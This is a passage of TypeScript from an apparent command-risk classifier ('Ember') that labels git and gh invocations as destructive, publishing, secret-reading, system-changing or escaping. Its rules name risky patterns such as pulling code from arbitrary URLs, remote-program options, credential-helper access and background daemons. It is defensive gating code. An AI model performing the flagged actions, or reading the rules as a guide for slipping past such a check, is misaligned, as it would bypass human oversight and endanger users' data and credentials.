  const all = flag("--all", "all", "branches");
  const mirror = flag("--mirror", "mirror");
  const tags = flag("--tags", "tags");
  flag("--follow-tags", "follow-tags");
  const prune = flag("--prune", "prune");
  const del = flag("--delete", "d", "delete");
  const force = flag("--force", "f", "force") || flag("--force-with-lease", "force-with-lease") || flag("--force-if-includes", "force-if-includes");
  flag("--set-upstream", "u", "set-upstream");
  if (values(p, "repo").length) widening.push("--repo");
  if (values(p, "receive-pack", "exec").length) { widening.push("--receive-pack"); h.e.unclear("unclear.git-receive-pack", "It runs a program on the other computer Ember can't see."); }
  for (const o of p.opts) {
    const known = ["-o", "-f", "-d", "-u", "-n", "-v", "-q", "-4", "-6"].includes(o.name) || /^--(all|branches|mirror|tags|follow-tags|no-follow-tags|prune|delete|force|force-with-lease|no-force-with-lease|force-if-includes|no-force-if-includes|set-upstream|dry-run|verbose|quiet|progress|no-progress|no-verify|verify|atomic|no-atomic|porcelain|thin|no-thin|ipv4|ipv6|signed|no-signed|push-option|repo|receive-pack|exec|recurse-submodules|no-recurse-submodules)$/.test(o.name);
    if (!known) widening.push(`?${o.name}`);
  }
  if (remote?.v && (URL_LIKE.test(remote.v) || SCP_LIKE.test(remote.v) || remote.v.includes("/"))) widening.push("url-remote");
  if (remote && remote.v === null) widening.push("?remote");
  const refDel = refs.filter(r => (r.v ?? "").startsWith(":"));
  const refForce = refs.filter(r => (r.v ?? "").startsWith("+"));
  if (refDel.length) widening.push(":ref");
  if (refForce.length) widening.push("+ref");
  const remoteText = remote?.v ?? (remote ? remote.raw : "the branch's remote");
  const branches = all ? "every branch" : mirror ? "everything" : tags && !refs.length ? "tags" : refs.length ? joinList(refs.map(r => r.v ?? r.raw)) : "the current branch";
  const objects: Obj[] = [];
  if (remote) objects.push({ kind: "remote", text: remote.v ?? remote.raw, abs: null });
  for (const r of refs) objects.push({ kind: /^(\+)?refs\/tags\//.test(r.v ?? "") ? "tag" : "branch", text: r.v ?? r.raw, abs: null });
  h.e.add("publish", "git.push", `Pushes ${branches} to ${remoteText}.`, { objects, widening, program: "git push" });
  if (force || refForce.length) h.e.add("remote-delete", "git.push.force", `Deletes or overwrites ${branches} on ${remoteText}.`, { objects, widening, program: "git push" });
  if (del || refDel.length) h.e.add("remote-delete", "git.push.delete", `Deletes ${del ? joinList(refs.map(r => r.v ?? r.raw)) || "branches" : joinList(refDel.map(r => (r.v ?? "").slice(1)))} on ${remoteText}.`, { objects, widening, program: "git push" });
  if (mirror) h.e.add("remote-delete", "git.push.mirror", `Deletes or overwrites everything on ${remoteText} to match this copy.`, { objects, widening, program: "git push" });
  if (prune) h.e.add("remote-delete", "git.push.prune", `Deletes branches on ${remoteText} that aren't here.`, { objects, widening, program: "git push" });
});

// fetch, pull and ls-remote run --upload-pack's program (on this computer for a local or ext:: remote).
const gitFetch = (fetches: boolean): GitFn => h => {
  if (h.args.some(a => /^--(upload-pack|exec)(=|$)/.test(a.v ?? ""))) h.e.unclear("unclear.git-receive-pack", "It runs a program Ember can't see.");
  h.e.readArgs(h.args.filter(a => !isOption(a)), h.sc);
  // Code fetched from an address rather than a remote the repository names (`git pull https://…`, `git fetch <url> &&
  // git merge FETCH_HEAD`) can change any file of the work tree, as a clone's are its (commands-remote-c5-4).
  // Only the repository word is an scp-style address: a refspec after it (`main:main`) looks like one.
  const ops = h.args.filter(a => !isOption(a));
  // A remote this line added with an address (`git remote add e <url> && git pull e main`) is that address too
  // (commands-remote-r8-1). A pull or fetch with no remote named, or `--all`, draws on it as well.
  const named = ops[0] !== undefined && h.e.addedRemotes.size > 0 && (ops[0].v === null || h.e.addedRemotes.has(ops[0].v) || h.e.addedRemotes.has(UNSEEN));
  const fromAdded = h.e.addedRemotes.size > 0 && (named || ops.length === 0 || h.args.some(a => a.v === "--all"));
  if (fetches && (ops.some(a => URL_LIKE.test(a.v ?? "")) || SCP_LIKE.test(ops[0]?.v ?? "") || fromAdded)) h.e.markUnnamed(".", h.sc);
};
git(["fetch", "pull"], gitFetch(true));
git(["ls-remote"], gitFetch(false));
// `git remote add NAME <url>` and `set-url`: read as before (GIT_READ), and NAME remembered for a fetch or pull from it
// later on this line, `-f` fetching from it at once (commands-remote-r8-1).
git(["remote"], h => {
  h.e.readArgs(h.args.filter(a => !isOption(a)), h.sc);
  const p = opts(h, { shortValue: "tm" });
  const [verb, name, url] = p.operands;
  // Where a later fetch or push goes (commands-remote-r9-11): changing an existing remote's address asks.
  if (verb?.v === "set-url") h.e.add("system", "git.config.remote", GIT_REMOTE_SAYS, { program: "git remote set-url" });
  if (!(verb?.v === "add" || verb?.v === "set-url") || !name || !url) return;
  if (url.v !== null && !URL_LIKE.test(url.v) && !SCP_LIKE.test(url.v)) return;
  h.e.addedRemotes.add(name.v ?? UNSEEN);
  if (verb.v === "add" && has(p, "f", "fetch")) h.e.markUnnamed(".", h.sc);
});
// apply and am change the work tree's files with a patch: one this task downloaded marks them (commands-remote-c5-4).
git(["apply", "am"], h => {
  const files = h.args.filter(a => !isOption(a));
  h.e.readArgs(files, h.sc);
  if (h.args.some(a => /^--(check|stat|numstat|summary|show-current-patch|abort|skip|quit)$/.test(a.v ?? ""))) return;
  if (appliesDownload(h, files)) h.e.markUnnamed(".", h.sc);
});
// diff, log and friends write their output to a file with --output; format-patch writes into -o's folder.
git(["diff", "log", "show", "format-patch", "range-diff", "whatchanged", "diff-tree", "diff-files", "diff-index", "shortlog"], h => {
  for (let k = 0; k < h.args.length; k++) {
    const v = h.args[k].v ?? "";
    const out = /^--output=(.*)$/.exec(v)?.[1] ?? (v === "--output" ? h.args[k + 1]?.v ?? null : undefined);
    if (out !== undefined) {
      if (out === null) { h.e.add("destroy", "redirect.overwrite", "Writes to a file Ember can't name."); continue; }
      const obj = h.e.usePath(lit(out), "write", h.sc);
      if (obj.abs) h.e.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
    }
    const dir = /^--output-directory=(.*)$/.exec(v)?.[1] ?? ((v === "-o" || v === "--output-directory") && h.key === "git" ? h.args[k + 1]?.v : undefined);
    if (dir) {
      const abs = resolveTargetPath(dir, { os: h.sc.os, home: h.sc.home ?? "", cwd: h.sc.cwd ?? "" });
      h.e.usePath(lit(dir), "list", h.sc);
      h.e.judgeInside(abs, "write", h.sc, dir);
    }
  }
  h.e.readArgs(h.args.filter(a => !isOption(a)), h.sc);
});

git(["clean"], h => {
  const p = opts(h, { shortValue: "e", longValue: ["exclude"] });
  if (has(p, "i", "interactive")) h.e.unclear("unclear.interactive", SAYS.interactive);
  if (has(p, "n", "dry-run")) return;
  const ignored = has(p, "x") || has(p, "X");
  const where = h.sc.cwd ?? "this folder";
  h.e.add("destroy", "git.clean", `Deletes files git doesn't track in ${where}${ignored ? ", including ignored files" : ""}.`, { widening: [...(has(p, "x") ? ["-x"] : []), ...(has(p, "X") ? ["-X"] : [])], program: "git clean", objects: objsOf(h, p.operands, "deleteTree") });
});

git(["reset"], h => {
  const p = opts(h, { longValue: ["pathspec-from-file"] });
  if (has(p, "p", "patch")) h.e.unclear("unclear.interactive", SAYS.interactive);
  const ops = p.operands.filter(a => a.v !== "--");
  const objects: Obj[] = ops.slice(0, 1).map(a => ({ kind: "other", text: a.v ?? a.raw, abs: null }));
  // To another commit (`origin/main`, `HEAD~1`), the branch moves too and drops what isn't in it (commands-remote-r1).
  const to = ops[0] && ops[0].v !== "HEAD" && ops[0].v !== "@" ? (ops[0].v ?? ops[0].raw) : null;
  const hard = to === null ? "Throws away changes that aren't committed." : `Moves the branch to ${to}, throwing away changes that aren't committed and any commits not in ${to}.`;
  // --merge throws away staged changes only, and --keep none (it stops rather than lose one): both still move the
  // branch to another commit (commands-remote-r1).
  const merge = to === null ? "Throws away staged changes; changes you haven't staged stay." : `Moves the branch to ${to}, throwing away staged changes and any commits not in ${to}.`;
  const keep = to === null ? "Unstages changes, keeping them in your files." : `Moves the branch to ${to}, dropping any commits not in ${to}; changes that aren't committed stay.`;
  if (has(p, "hard")) h.e.add("destroy", "git.reset.hard", hard, { objects, program: "git reset" });
  if (has(p, "merge")) h.e.add("destroy", "git.reset.merge", merge, { objects, program: "git reset" });
  if (has(p, "keep")) h.e.add("destroy", "git.reset.keep", keep, { objects, program: "git reset" });
});

git(["checkout"], h => {
  // --track takes a mode only after = (commands-remote-i5a).
  // Main's table gave it the next word, so the -b or -B after it named no branch and the words behind were files to
  // throw changes away in: judged that way too (commands-held-9).
  const p = heldOpts(h, { shortValue: "bB", longValue: ["orphan", "conflict", "pathspec-from-file"], longOptional: ["track"] }, { shortValue: "bB", longValue: ["orphan", "conflict", "pathspec-from-file", "track"] });
  if (has(p, "p", "patch")) h.e.unclear("unclear.interactive", SAYS.interactive);
  if (has(p, "pathspec-from-file")) h.e.unclear("unclear.pathspec-file", "Ember can't see which files it names.");
  if (has(p, "f", "force")) h.e.add("destroy", "git.checkout.force", "Throws away uncommitted changes.", { program: "git checkout" });
  const B = values(p, "B")[0];
  if (B !== undefined) h.e.add("destroy", "git.checkout.B", `Resets the branch ${B ?? "?"} if it exists.`, { objects: [{ kind: "branch", text: B ?? "?", abs: null }], program: "git checkout" });
  const dd = h.args.findIndex(a => a.v === "--");
  let paths: Arg[] = [];
  if (dd >= 0) paths = h.args.slice(dd + 1);
  else if (p.operands.some(a => a.v === ".")) paths = p.operands.filter(a => a.v === ".");
  else if (p.operands.length >= 2) paths = p.operands.slice(1);
  if (paths.length) {
    const objs = objsOf(h, paths, "write");
    // `git checkout <commit> -- <paths>` puts an older version in place: broader than discarding the changes.
    const before = dd >= 0 ? h.args.slice(0, dd).filter(a => !isOption(a)) : p.operands.length >= 2 ? p.operands.slice(0, 1) : [];
    const widening = before.some(a => a.v !== "HEAD") ? ["--source"] : [];
    h.e.add("destroy", "git.checkout.paths", `Throws away changes to ${listOf(objs)}.`, { objects: objs, program: "git checkout", widening });
    return;
  }
  if (p.operands.length === 1 && B === undefined && values(p, "b").length === 0 && !has(p, "orphan")) {
    // `git checkout name`: a branch, or a file whose changes it discards. The target says which exists.
    const obj = h.e.usePath(p.operands[0], "write", h.sc);
    if (obj.abs) h.e.add("destroy", "git.checkout.paths", `Throws away changes to ${obj.text}.`, { objects: [obj], ifExists: obj.abs, program: "git checkout" });
  }
});

git(["restore"], h => {
  const p = opts(h, { shortValue: "s", longValue: ["source", "pathspec-from-file", "conflict"] });
  if (has(p, "p", "patch")) h.e.unclear("unclear.interactive", SAYS.interactive);
  if (has(p, "pathspec-from-file")) h.e.unclear("unclear.pathspec-file", "Ember can't see which files it names.");
  const staged = has(p, "S", "staged");
  const worktree = has(p, "W", "worktree");
  if (staged && !worktree) return;
  const objs = objsOf(h, p.operands.filter(a => a.v !== "--"), "write");
  const widening = values(p, "s", "source").length ? ["--source"] : [];
  h.e.add("destroy", "git.restore", `Throws away changes to ${listOf(objs)}.`, { objects: objs, widening, program: "git restore" });
});

git(["switch"], h => {
  // Main's table gave --track the next word, so the -C or -f behind a -c it swallowed was read: judged that way too
  // (commands-held-9).
  const p = heldOpts(h, { shortValue: "cC", longValue: ["create", "force-create", "orphan", "conflict"], longOptional: ["track"] }, { shortValue: "cC", longValue: ["create", "force-create", "orphan", "conflict", "track"] });
  if (has(p, "discard-changes", "f", "force") || values(p, "C", "force-create").length) h.e.add("destroy", "git.switch", "Throws away uncommitted changes.", { program: "git switch" });
});

git(["branch"], h => {
  // -t (--track) takes no value, and --track, --color and --column one only after = (commands-remote-i5a).
  // Main's table gave all four the next word, so the -D or -M behind a `--` or an option one of them swallowed was
  // read: judged that way too (commands-held-9).
  const p = heldOpts(h, { shortValue: "u", longValue: ["set-upstream-to", "contains", "no-contains", "merged", "no-merged", "points-at", "sort", "format"], longOptional: ["track", "color", "column"] }, { shortValue: "tu", longValue: ["set-upstream-to", "contains", "no-contains", "merged", "no-merged", "points-at", "sort", "format", "color", "column", "track"] });
  const names = p.operands;
  if (has(p, "D") || (has(p, "d", "delete") && has(p, "f", "force"))) {
    h.e.add("destroy", "git.branch.D", `Deletes the branch ${joinList(names.map(n => n.v ?? n.raw)) || "?"} even if it isn't merged.`, { objects: names.map(GIT_BRANCH_OBJ), program: "git branch" });
  }
  if (has(p, "M", "C") || ((has(p, "m", "move", "c", "copy")) && has(p, "f", "force"))) {
    const target = names[names.length - 1];
    h.e.add("destroy", "git.branch.M", `Replaces the branch ${target?.v ?? "?"} if it exists.`, { objects: names.map(GIT_BRANCH_OBJ), program: "git branch" });
  }
  if (has(p, "edit-description")) h.e.unclear("unclear.interactive", SAYS.interactive);
});

git(["stash"], h => {
  const sub = h.args[0]?.v ?? "push";
  if (sub === "drop") h.e.add("destroy", "git.stash.drop", "Deletes stashed changes.", { objects: h.args.slice(1).filter(a => !isOption(a)).map(a => ({ kind: "other", text: a.v ?? a.raw, abs: null })), program: "git stash" });
  else if (sub === "clear") h.e.add("destroy", "git.stash.clear", "Deletes stashed changes.", { program: "git stash" });
  else if (h.args.some(a => a.v === "-p" || a.v === "--patch")) h.e.unclear("unclear.interactive", SAYS.interactive);
});

git(["tag"], h => {
  // --create-reflog takes no value, and --color and --column one only after = (commands-remote-i5a).
  // Main's table gave all three the next word, so the -d or -f behind a -m or -u one of them swallowed was read:
  // judged that way too (commands-held-9).
  const p = heldOpts(h, { shortValue: "umF", longValue: ["local-user", "message", "file", "sort", "format", "contains", "no-contains", "points-at", "merged", "no-merged", "cleanup"], longOptional: ["color", "column"] }, { shortValue: "umF", longValue: ["local-user", "message", "file", "sort", "format", "contains", "no-contains", "points-at", "merged", "no-merged", "color", "column", "cleanup", "create-reflog"] });
  if (has(p, "d", "delete")) h.e.add("destroy", "git.tag.delete", `Deletes the tag ${joinList(p.operands.map(a => a.v ?? a.raw)) || "?"}.`, { objects: p.operands.map(a => ({ kind: "tag", text: a.v ?? a.raw, abs: null })), program: "git tag" });
  if (has(p, "f", "force")) h.e.add("destroy", "git.tag.force", `Replaces the tag ${p.operands[0]?.v ?? "?"} if it exists.`, { program: "git tag" });
  if ((has(p, "a", "annotate", "s", "sign") || values(p, "u", "local-user").length) && !values(p, "m", "message", "F", "file").length) h.e.unclear("unclear.interactive", SAYS.interactive);
});

git(["gc"], h => {
  if (h.args.some(a => /^--prune=(now|all)$/.test(a.v ?? "")) || h.args.some((a, k) => a.v === "--prune" && /^(now|all)$/.test(h.args[k + 1]?.v ?? ""))) {
    h.e.add("destroy", "git.history", "Deletes history git keeps for recovery.", { program: "git gc" });
  }
});
git(["reflog"], h => { if (/^(expire|delete)$/.test(h.args[0]?.v ?? "")) h.e.add("destroy", "git.history", "Deletes history git keeps for recovery.", { program: "git reflog" }); });
git(["filter-branch", "filter-repo", "prune"], h => {
  h.e.add("destroy", "git.history", "Deletes history git keeps for recovery.", { program: `git ${h.key}` });
  // filter-branch runs each filter with sh for every commit.
  for (let k = 0; k < h.args.length; k++) {
    if (!/^--(env|tree|index|parent|msg|commit|tag-name)-filter$/.test(h.args[k].v ?? "")) continue;
    const t = h.args[k + 1]?.v;
    if (t) h.e.nested(t, "sh", h.sc, "git filter-branch");
    else h.e.unclear("unclear.shell-text", "It runs shell text Ember can't see.");
  }
});
git(["replace", "update-ref", "symbolic-ref"], h => { if (h.args.some(a => a.v === "-d" || a.v === "--delete")) h.e.add("destroy", "git.history", "Deletes history git keeps for recovery."); });
git(["worktree"], h => {
  if (h.args[0]?.v === "remove" && h.args.some(a => a.v === "-f" || a.v === "--force")) h.e.add("destroy", "git.history", "Deletes history git keeps for recovery.");
  if (h.args[0]?.v === "remove") { const objs = objsOf(h, h.args.slice(1).filter(a => !isOption(a)), "deleteTree"); h.e.add("destroy", "git.worktree.remove", `Deletes ${listOf(objs)} and everything in it.`, { objects: objs }); }
  // add checks files out into a folder, move moves a work tree to one: §3.6's rules meet that folder (review #169).
  if (h.args[0]?.v === "add" || h.args[0]?.v === "move") {
    const p = parseOpts(h.args.slice(1), { shortValue: "bB", longValue: ["reason"] });
    const to = p.operands[h.args[0].v === "add" ? 0 : 1];
    if (to?.v === null) h.e.add("destroy", "redirect.overwrite", "Writes to files Ember can't name.");
    else if (to?.v) writeInto(h, to.v);
  }
});
// checkout-index writes each file at <prefix><path>: a prefix ending in a slash is a folder, any other the start of
// each name (review #169). Without one it writes the work tree's own files (writesUnnamedFiles).
git(["checkout-index"], h => {
  const p = opts(h, { longValue: ["prefix", "stage"] });
  const files = p.operands.filter(a => a.v !== "--");
  const prefix = values(p, "prefix")[0];
  if (h.args.some(a => a.v === null && /^--prefix/.test(a.raw))) { h.e.add("destroy", "redirect.overwrite", "Writes to files Ember can't name."); return; }
  if (prefix === undefined || prefix === "") { h.e.readArgs(files, h.sc); return; }
  if (prefix === null || files.some(f => f.v === null)) { h.e.add("destroy", "redirect.overwrite", "Writes to files Ember can't name."); if (prefix === null) return; }
  for (const f of files) if (f.v !== null) h.e.usePath(lit(prefix + f.v), "write", h.sc);
  if (has(p, "a", "all", "stdin") || files.length === 0) writeInto(h, prefix.replace(/[^\\/]*$/, "") || ".");
});
git(["rm"], h => {
  const p = opts(h, { longValue: ["pathspec-from-file"] });
  const objs = objsOf(h, p.operands.filter(a => a.v !== "--"), has(p, "cached") ? "read" : has(p, "r") ? "deleteTree" : "delete");
  if (has(p, "f", "force") && !has(p, "cached")) h.e.add("destroy", "git.rm", `Deletes ${listOf(objs)} from the working folder.`, { objects: objs, program: "git rm" });
});
git(["mv"], h => {
  const p = opts(h);
  objsOf(h, p.operands.slice(0, -1), "move");
  const dest = p.operands[p.operands.length - 1];
  if (dest) { const obj = h.e.usePath(dest, "write", h.sc); if (has(p, "f", "force") && obj.abs) h.e.add("destroy", "posix.mv", `Replaces ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs }); }
});
git(["send-email"], h => { h.e.add("publish", "git.send-email", "Sends commits by email.", { program: "git send-email" }); h.e.readArgs(h.args.filter(a => !isOption(a)), h.sc); });
git(["svn"], h => { if (/^(dcommit|set-tree|commit-diff|branch|tag|mkdirs)$/.test(h.args[0]?.v ?? "")) h.e.add("publish", "git.svn.dcommit", "Sends commits to Subversion.", { program: "git svn" }); });
git(["p4"], h => { if (h.args[0]?.v === "submit") h.e.add("publish", "p4.submit", "Submits changes to Perforce.", { program: "git p4" }); });
git(["cvsexportcommit"], h => { h.e.add("publish", "git.cvsexportcommit", "Sends commits to CVS."); });
git(["credential", "credential-store", "credential-cache", "credential-manager", "credential-manager-core", "credential-osxkeychain", "credential-libsecret", "credential-wincred"], h => {
  if (h.key === "credential" && !/^(fill|approve|reject|store|erase|get)$/.test(h.args[0]?.v ?? "")) return;
  h.e.add("secret", "secret.git-credential", SAYS.secrets, { program: "git credential" });
});
git(["config"], h => {
  // --fixed-value takes no value (commands-remote-i5a).
  // Main's table gave --fixed-value the next word: judged that way too (commands-held-8).
  const p = heldOpts(h, { shortValue: "f", longValue: ["file", "blob", "type", "default", "comment", "value"] }, { shortValue: "f", longValue: ["file", "blob", "type", "default", "comment", "value", "fixed-value"] });
  const ops = p.operands;
  let sub = ops[0]?.v ?? null;
  const subs = ["get", "set", "unset", "list", "rename-section", "remove-section", "edit", "get-color", "get-colorbool"];
  let keyArg: Arg | undefined;
  let write = has(p, "unset", "unset-all", "add", "replace-all", "rename-section", "remove-section", "e", "edit");
  if (sub !== null && subs.includes(sub)) {
    write = write || ["set", "unset", "rename-section", "remove-section", "edit"].includes(sub);
    keyArg = ops[1];
  } else {
    sub = null;
    keyArg = ops[0];
    if (!has(p, "get", "get-all", "get-regexp", "get-urlmatch", "l", "list", "name-only") && ops.length >= 2) write = true;
  }
  if (has(p, "e", "edit") || sub === "edit") h.e.unclear("unclear.interactive", SAYS.interactive);
  const key = keyArg?.v ?? null;
  if (write) {
    if (key === null || GIT_CODE_KEYS.some(re => re.test(key))) h.e.add("system", "git.config.code", "Changes what git runs later.", { program: "git config" });
    // A remote's address, and whether git checks the server it talks to (commands-remote-r9-11).
    if (key !== null && GIT_REMOTE_KEYS.test(key)) h.e.add("system", "git.config.remote", GIT_REMOTE_SAYS, { program: "git config" });
    if (key !== null && /^remote\..+\.(url|pushurl)$/i.test(key) && ops.some(o => GIT_HELPER_ADDRESS.test(o.v ?? ""))) h.e.unclear("unclear.git-ext", GIT_EXT_SAYS);
    if (has(p, "system")) h.e.add("system", "git.config.system", "Changes settings for every user.", { program: "git config" });
    for (const f of values(p, "f", "file")) if (f) h.e.usePath(lit(f), "write", h.sc);
  } else if (key !== null && /^credential\./i.test(key)) h.e.add("secret", "secret.git-credential", SAYS.secrets, { program: "git config" });
});
git(["submodule"], h => {
  if (h.args[0]?.v === "add") {
    // A submodule added from an address is a clone into its folder (named, else the address's last part): building in
    // it later runs the download (commands-remote-r8-1).
    const [url, dir] = parseOpts(h.args.slice(1), { shortValue: "b", longValue: ["branch", "name", "reference", "depth"] }).operands;
    const from = dir ?? url;
    if (from?.v === null) h.e.markUnnamed(dir ? null : ".", h.sc);
    else if (from?.v) h.e.download(dir ? from.v : from.v.replace(/[\\/]+$/, "").split(/[\\/:]/).pop()?.replace(/\.git$/, "") || null, h.sc);
  }
  if (h.args[0]?.v !== "foreach") { h.e.readArgs(h.args.slice(1).filter(a => !isOption(a)), h.sc); return; }
  const rest = h.args.slice(1).filter(a => !/^--(recursive|quiet)$/.test(a.v ?? "") && a.v !== "-q");
  if (rest.some(a => a.v === null)) { h.e.unclear("unclear.shell-text", "It runs shell text Ember can't see."); return; }
  h.e.nested(rest.map(a => a.v).join(" "), "sh", h.sc, "git submodule foreach");
});
// `git grep` is the grep family, so its -O/--open-files-in-pager runs a program on the matches, like rg's --pre (review #165).
git(["grep"], h => { NATIVE["git-grep"]({ ...h, key: "git-grep", prog: "git grep" }); });
git(["bisect"], h => { if (h.args[0]?.v === "run") h.e.payload(h.args.slice(1), h.sc, "git bisect run"); });
git(["rebase"], h => {
  // -S and --gpg-sign take a key only attached or after = (commands-remote-i5a).
  // Main's table gave --gpg-sign the next word and read -S's letters one by one, so the -i or --exec behind an option
  // it swallowed was read: judged that way too (commands-held-9).
  const p = heldOpts(h, { shortValue: "xsX", shortOptional: "S", longValue: ["exec", "onto", "strategy", "strategy-option", "whitespace", "empty"], longOptional: ["gpg-sign"] }, { shortValue: "xsX", longValue: ["exec", "onto", "strategy", "strategy-option", "gpg-sign", "whitespace", "empty"] });
  if (has(p, "i", "interactive", "edit-todo")) h.e.unclear("unclear.interactive", SAYS.interactive);
  for (const x of values(p, "x", "exec")) {
    if (x === null) h.e.unclear("unclear.shell-text", "It runs shell text Ember can't see.");
    else h.e.nested(x, "sh", h.sc, "git rebase --exec");
  }
});
git(["commit"], h => {
  // -u and -S take a value only attached, --untracked-files and --gpg-sign only after = (commands-remote-i5a).
  const spec: OptSpec = { shortValue: "mFCct", shortOptional: "uS", longValue: ["message", "file", "reuse-message", "reedit-message", "fixup", "squash", "author", "date", "template", "cleanup", "trailer", "pathspec-from-file"], longOptional: ["untracked-files", "gpg-sign"] };
  // Main's table gave all four the next word, so `git commit -S -m wip` had no message and asked: judged that way too
  // (commands-held-2).
  const was: OptSpec = { shortValue: "mFCcutS", longValue: ["message", "file", "reuse-message", "reedit-message", "fixup", "squash", "author", "date", "template", "cleanup", "trailer", "untracked-files", "pathspec-from-file", "gpg-sign"] };
  const p = heldOpts(h, spec, was);
  if (has(p, "p", "patch", "interactive", "e", "edit") || values(p, "c", "reedit-message").length) h.e.unclear("unclear.interactive", SAYS.interactive);
  else if (!values(p, "m", "message", "F", "file", "C", "reuse-message", "fixup").length && !has(p, "no-edit")) h.e.unclear("unclear.interactive", SAYS.interactive);
  for (const f of values(p, "F", "file", "t", "template")) if (f && f !== "-") h.e.usePath(lit(f), "read", h.sc);
  h.e.readArgs(p.operands, h.sc);
});
git(["add"], h => {
  const p = opts(h, { longValue: ["pathspec-from-file", "chmod"] });
  if (has(p, "i", "interactive", "p", "patch", "e", "edit")) h.e.unclear("unclear.interactive", SAYS.interactive);
  h.e.readArgs(p.operands.filter(a => a.v !== "--"), h.sc);
});
git(["revert", "cherry-pick"], h => {
  if (h.args.some(a => a.v === "-e" || a.v === "--edit")) h.e.unclear("unclear.interactive", SAYS.interactive);
  else if (h.key === "revert" && !h.args.some(a => /^(--no-edit|-n|--no-commit|--abort|--quit|--continue|--skip)$/.test(a.v ?? ""))) h.e.unclear("unclear.interactive", SAYS.interactive);
});
git(["clone"], h => {
  const p = opts(h, { shortValue: "obcuj", longValue: ["origin", "branch", "config", "upload-pack", "template", "reference", "reference-if-able", "separate-git-dir", "depth", "shallow-since", "shallow-exclude", "jobs", "filter", "server-option", "bundle-uri", "ref-format", "revision"] });
  for (const c of values(p, "c", "config")) { const key = (c ?? "").split("=")[0]; if (c === null || GIT_CODE_KEYS.some(re => re.test(key))) h.e.unclear("unclear.git-config", "Runs code from a git setting."); }
  if (values(p, "template", "u", "upload-pack").length) h.e.unclear("unclear.git-template", "Runs code from a git setting.");
  const [url, dir] = p.operands;
  if (url && url.v && !URL_LIKE.test(url.v) && !SCP_LIKE.test(url.v)) h.e.usePath(url, "readTree", h.sc);
  if (dir) h.e.usePath(dir, "write", h.sc);
  // The folder it makes: the one named, else the address's last part; with a part Ember can't see, the names the text
  // gives it, else a folder of no name Ember knows, here (the address's) or anywhere (`git clone … "$d"`), so building
  // in it later asks (commands-remote-r6-1).
  const from = dir ?? url;
  if (!from) return;
  for (const f of h.e.knownForms(from, true)) {
    const form = (f ?? UNSEEN).replace(/[\\/]+$/, "");
    const name = dir ? form : (form.split(/[\\/:]/).pop() ?? "").replace(/\.git$/, "");
    if (!name.includes(UNSEEN)) h.e.download(name || null, h.sc);
    else if (!dir) h.e.markUnnamed(".", h.sc);
    else { const seen = name.slice(0, name.indexOf(UNSEEN)); h.e.markUnnamed(seen.includes("/") ? seen.slice(0, seen.lastIndexOf("/") + 1) : seen === "" ? null : ".", h.sc); }
  }
  // With a folder word Ember can't see, the address's own name is marked as well, as on main: no form of the word
  // decides less safely than it did (commands-remote-x7-2).
  if (dir && dir.v === null && url?.v) h.e.download(url.v.replace(/[\\/]+$/, "").split(/[\\/:]/).pop()?.replace(/\.git$/, "") ?? null, h.sc);
});
git(["archive"], h => {
  const p = opts(h, { shortValue: "o", longValue: ["output", "format", "prefix", "remote", "exec", "add-file", "add-virtual-file"] });
  if (values(p, "exec").length) h.e.unclear("unclear.git-receive-pack", "It runs a program on the other computer Ember can't see.");
  // `git archive --remote=…` fetches a tree from another repository: what it writes to a file, or pipes on to an
  // unpacker (`git archive --remote=… | tar x`), is a download, like what `ssh host …` prints (commands-remote-r8-2).
  const remote = values(p, "remote").length > 0;
  if (remote) h.e.pipe.fetch = true;
  for (const o of values(p, "o", "output")) if (o) { const obj = h.e.usePath(lit(o), "write", h.sc); if (obj.abs) { h.e.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs }); if (remote) h.e.download(o, h.sc); } }
});
git(["lfs"], h => {
  const sub = h.args[0]?.v;
  if (sub === "push") h.e.add("publish", "git.push", "Pushes large files to the remote.", { program: "git lfs push" });
  else if (sub === "install" || sub === "uninstall") h.e.add("system", "path.hook", "Adds a git hook that runs later.");
});
git(["difftool", "mergetool"], h => { h.e.unclear("unclear.interactive", SAYS.interactive); });
git(["gui", "citool", "gitk"], h => { h.e.unclear("unclear.gui", SAYS.openApp); });
git(["instaweb", "fsmonitor--daemon"], h => { h.e.add("escape", "escape.background", SAYS.keepsRunning); });
git(["daemon"], h => { h.e.add("publish", "git.daemon", "Shares repositories on the network."); });
git(["maintenance"], h => { if (/^(start|register)$/.test(h.args[0]?.v ?? "")) h.e.add("system", "system.schedule", "Schedules something to run later or at login."); });
git(["hook", "upload-pack", "receive-pack", "http-backend", "shell", "for-each-repo"], h => { h.e.unclear(`unclear.git-${h.key}`, "Runs code Ember can't see."); });

// gh (§3.5.2-§3.5.4).
const GH_WHAT: Readonly<Record<string, string>> = {
  pr: "a pull request", issue: "an issue", release: "a release", repo: "the repository", gist: "a gist", secret: "a secret",
  variable: "a variable", workflow: "a workflow", run: "a workflow run", label: "a label", cache: "the cache", project: "a project",
  "ssh-key": "an SSH key", "gpg-key": "a GPG key", codespace: "a codespace", ruleset: "a ruleset", org: "an organisation",
};
const GH_WRITE: Readonly<Record<string, string[]>> = {
  pr: ["create", "new", "merge", "close", "reopen", "edit", "comment", "review", "ready", "lock", "unlock", "update-branch", "revert"],
  issue: ["create", "new", "close", "reopen", "edit", "comment", "transfer", "lock", "unlock", "pin", "unpin", "develop"],
  release: ["create", "new", "upload", "edit"],
  repo: ["create", "new", "edit", "fork", "rename", "archive", "unarchive", "sync", "set-default", "deploy-key", "autolink"],
  gist: ["create", "new", "edit", "rename"],
  secret: ["set"], variable: ["set"], workflow: ["run", "enable", "disable"], run: ["rerun", "cancel"], label: ["create", "edit", "clone"],
  project: ["create", "edit", "close", "copy", "link", "unlink", "field-create", "item-add", "item-create", "item-edit", "mark-template"],
  "ssh-key": ["add"], "gpg-key": ["add"], codespace: ["create", "edit", "ports", "rebuild", "stop", "cp"], org: [],
};
const GH_DELETE: Readonly<Record<string, string[]>> = {
  repo: ["delete"], release: ["delete", "delete-asset"], issue: ["delete"], secret: ["delete", "remove"], variable: ["delete"],
  run: ["delete"], cache: ["delete"], label: ["delete"], gist: ["delete"], project: ["delete", "field-delete", "item-delete", "item-archive"],
  "ssh-key": ["delete"], "gpg-key": ["delete"], codespace: ["delete"], ruleset: [],
};
reg(NATIVE, ["gh"], h => {
  const g = globals(h, "gh");
  checkGlobals(h, "gh", g);
  const group = h.args[g.verbAt]?.v ?? null;
  const rest = h.args.slice(g.verbAt + 1);
